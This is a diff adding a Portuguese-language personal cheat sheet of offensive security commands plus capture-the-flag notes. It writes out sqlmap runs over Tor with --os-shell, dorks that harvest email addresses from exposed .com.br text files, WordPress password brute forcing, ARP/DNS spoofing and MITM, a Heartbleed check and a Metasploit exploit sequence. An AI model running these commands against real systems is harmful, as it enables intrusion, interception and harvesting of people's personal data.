@@ -1,0 +1,316 @@
+  
+>>>> SQLMAP <<<<
+
+sqlmap -u "www.alvo.com.br" --dbs
+sqlmap -g "inurl:index.php site:.com.br" --random-agent
+sqlmap -u "www.alvo.com.br" --check-tor --tor --tor-port=9050 --tor-type=socks5 --dbs --random-agent 
+--forms		// atanque em forms
+--check-waf     // verifica se existe firewall
+--beep 		// faz alerta sonoro ao encontrar vulnerabilidade
+--os-shell	// tenta exploitar um shell no alvo
+--batch 	// faz todas perguntas por padrao
+_______________________________________________________________________
+
+>>>> PROXY <<<<
+
+service tor start
+proxychains google-chrome-stable www.site.com
+_______________________________________________________________________
+
+>>>> PASTA DO APACHE NO FREEBSD <<<<
+
+/usr/local/www/apache24/data
+_______________________________________________________________________
+
+>>>> CRIAR CERTIFICADO SSH <<<<
+
+ssh-keygen -t rsa
+scp /home/usuario/.ssh/id_rsa.pub usuari@maquina:/home/usuario/
+ssh usuario@maquina
+cat /home/usuario/id_rsa.pub >> /home/usuario/.ssh/authorized_keys
+---------------------OU-----------------------------------------------
+ssh-copy-id -i /home/usuario/.ssh/id_rsa.pub usuario@maquina
+_______________________________________________________________________
+
+scp Multitools.py root@93.188.163.87:/var/www/html/.python
+scp -r /pasta/ root@93.188.163.87:/var/www/html/
+// Transfere o arquivo Multitools para a pasta .python
+
+zip -R pasta/ arquivo.zip
+_______________________________________________________________________
+
+>>>> UNISCAN <<<<
+
+./uniscan.pl -u http://alvo.com -bqwdsergj
+________________________________________________________________________
+
+>>>> NIKTO <<<<
+
+nikto -h www.alvo.com -o alvo.html
+________________________________________________________________________
+
+>>>> INURLBR <<<<
+
+inurlbr --dork='site:.com.br gmail ext:txt' -s 'teste.txt' -m
+inurlbr --dork 'site:.com.br email & (hotmail|gmail|yahoo) -site:www.alvo.com.br ext:txt' -s alvo.txt -q 1 -m
+________________________________________________________________________
+
+>>>> BETTERCAP <<<<
+
+bettercap -X
+________________________________________________________________________
+
+>>>> WPSCAN <<<<
+
+wpscan --url http://alvo.com --enumerate vpt
+wpscan --url http://alvo.com --wordlist /caminho/da/wordlist.txt --username admin --threads 10
+________________________________________________________________________
+
+>>>> CRUNCH <<<<
+
+./crunch 8 8 1234567890 -o /local/da/saida.txt
+________________________________________________________________________
+
+>>>> SAWEF <<<<
+
+python sawef.py --url "http://www.alvo.com" --response emails
+python sawef.py --url "http://www.alvo.com" --response links
+________________________________________________________________________
+
+>>>> SETTOOLKIT E ETTERCAP <<<<
+
+cd  /etc/setoolkit/ 		#pasta de configuração do setoolkit
+vim /etc/ettercap/etter.dns     #arquivo de configuração de Arp Spoofing
+
+ettercap -Tqi wlan0 -P dns_spoof -M arp // //
+_______________________________________________________________________
+
+>>>> SERVIÇOS <<<<
+
+service tor 		start
+service apache2 	start
+service postgresql 	start
+service metasploit	start
+_______________________________________________________________________
+
+>>>> CUPP <<<<
+
+./cupp.py -i
+
+_______________________________________________________________________
+>>>> Sources List <<<<
+
+/etc/apt/sources.list
+
+_______________________________________________________________________
+>>>> HeartBeat<<<<
+
+site pra teste: http://filippo.io/Heartbleed
+python heartbleed.py www.alvo.com
+_______________________________________________________________________
+>>>> MITMF <<<
+
+mitmf --arp --spoof --hsts --gateway=192.168.25.1 -i wlan0
+
+______________________________________________________________________
+>>>> Descobrir IP Externo <<<<
+
+curl ifconfig.me
+______________________________________________________________________
+>>>> Arch Linux <<<<
+
+sudo pacman -Sg | grep blackarch| more
+sudo pacman -S blackarch-
+_____________________________________________________________________
+>>>> metasploit <<<<
+
+use exploit/multi/ftp/pureftpd_bash_env_exec
+show targets
+set TARGET <target-id>
+show options
+set OPTION <target-option>
+exploit
+
+
+
+
+
+
+
+>>>> HEXADECIMAL <<<<
+
+$ xxd webapptest.png | head
+
+0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
+0000010: 0000 095d 0000 0aa2 0802 0000 0073 ea37  ...].........s.7
+0000020: 9300 0b21 4a49 4441 5478 9cec dd5b 7095  ...!JIDATx...[p.
+0000030: c79d ee7f 5d51 bae0 42e1 624a 17a1 4a53  ....]Q..B.bJ..JS
+0000040: 5c18 6a6a 9748 aac0 ae62 124c 2529 f9c2  \.jj.H...b.L%)..
+0000050: 149e 61a6 504d 32b0 2626 0338 ae2d 921d  ..a.PM2.&&.8.-..
+0000060: 821d 76b0 d901 8bd9 8306 b2c1 c6fc 0d96  ..v.............
+0000070: 1d04 b6c5 c212 4648 1cc4 2904 1302 429c  ......FH..)...B.
+0000080: 3146 4660 0192 4144 c488 11d8 c4eb ff58  1FF`..AD.......X
+0000090: 3fab ddf4 3ae8 042c 1dbe bb3e a57a d7fb  ?...:..,...>.z..
+
+$ xdd miniman.pdf | head
+
+
+0000000: 2550 4446 2d31 2e34 0a25 c3a4 c3bc c3b6  %PDF-1.4.%......
+0000010: c39f 0a32 2030 206f 626a 0a3c 3c2f 4c65  ...2 0 obj.<</Le
+0000020: 6e67 7468 2033 2030 2052 2f46 696c 7465  ngth 3 0 R/Filte
+0000030: 722f 466c 6174 6544 6563 6f64 653e 3e0a  r/FlateDecode>>.
+0000040: 7374 7265 616d 0a78 9cdd 3dc9 8e2c 396e  stream.x..=..,9n
+0000050: f7fa 8a3c 0ff0 9eb5 8522 0228 2490 9595  ...<.....".($...
+0000060: 65c0 b7b1 1bf0 a1e1 93ed f6c0 e836 3073  e............60s
+0000070: 99df b724 92da a825 72e9 87b6 e7a1 6b52  ...$...%r.....kR
+0000080: 9941 8648 8912 3751 e2bb 3cfd fded af27  .A.H..7Q..<....'
+0000090: 71fa 26be abd3 66e4 f7ed b4ec 8bfb fcb7  q.&...f.........
+
+
+$ xdd notas.txt| head
+
+0000000: 0a3e 3e3e 3e20 5351 4c4d 4150 203c 3c3c  .>>>> SQLMAP <<<
+0000010: 3c0a 0a73 716c 6d61 7020 2d75 2022 7777  <..sqlmap -u "ww
+0000020: 772e 616c 766f 2e63 6f6d 2e62 7222 202d  w.alvo.com.br" -
+0000030: 2d64 6273 0a73 716c 6d61 7020 2d67 2022  -dbs.sqlmap -g "
+0000040: 696e 7572 6c3a 696e 6465 782e 7068 7020  inurl:index.php 
+0000050: 7369 7465 3a2e 636f 6d2e 6272 2220 2d2d  site:.com.br" --
+0000060: 7261 6e64 6f6d 2d61 6765 6e74 0a73 716c  random-agent.sql
+0000070: 6d61 7020 2d75 2022 7777 772e 616c 766f  map -u "www.alvo
+0000080: 2e63 6f6d 2e62 7222 202d 2d63 6865 636b  .com.br" --check
+
+_____________________________________________________________________
+>>>>TIPO DE ARQUIVO<<<<
+
+$ file notas.txt
+notas.txt: UTF-8 Unicode text
+
+$ file webapptest.png
+webapptest.png: PNG image data, 2397 x 2722, 8-bit/color RGB, non-interlaced
+
+$ file miniman.pdf
+miniman.pdf: PDF document, version 1.4
+_____________________________________________________________________
+>>>> Ver as Strings de um arquivo <<<<
+
+$ strings  arquivo.tipo
+$ strings  arquivo.tipo | grep "desec"
+$ strings  arquivo.tipo | grep "flag"
+$ strings  arquivo.tipo | grep "{"
+
+______________________________________________________________________
+>>> Editar e Copilar HEXADECIMAL <<<<
+
+- pelo vim
+
+$ vim -b arquivo.pdf 
+
+- pelo xxd
+
+$ xxd -ps miniman.pdf > miniman.hex
+ira virar hexa
+
+$ xdd -r -p miniman.hex > miniman.pdf 
+ira converter de hexa pra pdf
+_______________________________________________________________________
+>>>> Base64 Decode <<<<
+
+$ echo "BASE64" | base64 -d
+
+>>>> Encontrar Tipo de Hash <<<<
+
+$ hashid 'hashaqui'
+________________________________________________________________________
+>>>> Scan NMAP portas UDP <<<<
+
+$ nmap -v --open -sUV --top-ports=25 -T5 10.0.0.1
+________________________________________________________________________
+ >>> tftp roda porta 69 <<<
+
+$ tftp
+> connect
+(to) 10.0.0.1
+> status
+> get flag
+_______________________________________________________________________
+>>>> nc connect SNMP PORTA 161 <<<<
+
+$ nc -vu 10.0.0.1 161
+<tecla enter>
+_______________________________________________________________________
+>>>> smbclient <<<<
+
+$ smbclient -L 10.0.0.1 -N
+
+# nota Deivid¹: procura o compartilhamento diferente do padrao  ipc$, c$, admin$.
+
+$ smbclient //10.0.0.1/pasta -N
+> ls
+> get flag.txt
+_______________________________________________________________________
+>>>> Alterar MAC <<<<
+
+$ macchanger -m 00:11:22:33:444:55 eth0
+
+_______________________________________________________________________
+# nota Deivid²: arquivos do wireshark (.pcap) use o filtro "ftp" , 
+  procure por usuario e senha, lembre-se que pode ter bloqueio de mac.
+
+# nota Deivid³: se o site for "https" veja as informações sobre o
+  certificado ( no cadiadinho do lado do link no navegador ), procure 
+  Details e Issuer.
+
+# nota Deivid³: se o site for 10.0.0.1/secreto/index.php?secreto
+  lembre-se que secreto pode ser um parametro,
+  passe entao o desejado,   a flag, ficando
+  > 10.0.0.1/secreto/index.php?secreto=flag
+  com a resposta tente usar ela como um diretorio do site
+  > 10.0.0.1/segredo/flagencontrada
+  procure dai a flag neste diretorio.
+
+# nota Deivid³: Se o arquivo for um zip e estiver bloqueado por senha, 
+  utilize a dica e faça um bruteforce
+    $ for i in {0.999}
+      > do 
+      > unrar e -p"dica$i" "flag.rar"
+      > done
+
+# nota Deivid³: lembre-se de sempre lear as strings do arquivo!!!
+  $ strings arquivo.tipo
+  $ strings arquivo.tipo | grep "desec"
+
+# nota Deivid³: se o aquivo for Thumbs.db, tentei usar o vinetto para  
+  extrair o contedo e procure a flag.
+
+# nota Deivid³: Se a imagem estiver corrompida, tente ver o haxa dela ou procurar strings ou algo incomum, como excesso de codigo (vim -b img.png)
+______________________________________________________________________
+# Notas Flags Resolvidas
+
+# Se for uma img com alfabeto, verifique se falta letras, se faltar tente com elas
+montar uma palavra, procure padroes, dentro das fotos podem conter as respostas.
+
+# A Flag geralmente esta em hexadecimal ou base64.
+
+# Caso seja um .PST (Arquivo do MIcrossoft Outlook) utilize o readpst
+  > readpst -S arquivo.pst
+
+# Procure intercarlar as letras de uma flag, buscando um padrao.
+
+# Caso seja .mdb (acess do msoffice) utilize o gmdb2 para abrir e exportar. ou
+# mdb-*
+  > Utilize para descobrir o nome da tabela;
+    $ mdb-table flag.mdb 
+  > E Dois realize um dump dos dados encontrados.
+    $ mdb-export flag.mdb tableaencontrada
+
+# Utilize o comando display para abrir um imagem.
+  $ display imagem.png
+
+# Caso seja um QRCODE utilize o zberimg.
+  $ zbarimg qrcode.png
+  > (Pode vir um hexadeximal, transforme em ascii)
+
+# Caso seja Stego, utilize o silenteye para abrir e tentar achar a stenografia.
+
+# Caso seje flag.pcap utilize
+  $ tcpdump -qns 0 -A -r net30.pcap | grep HC
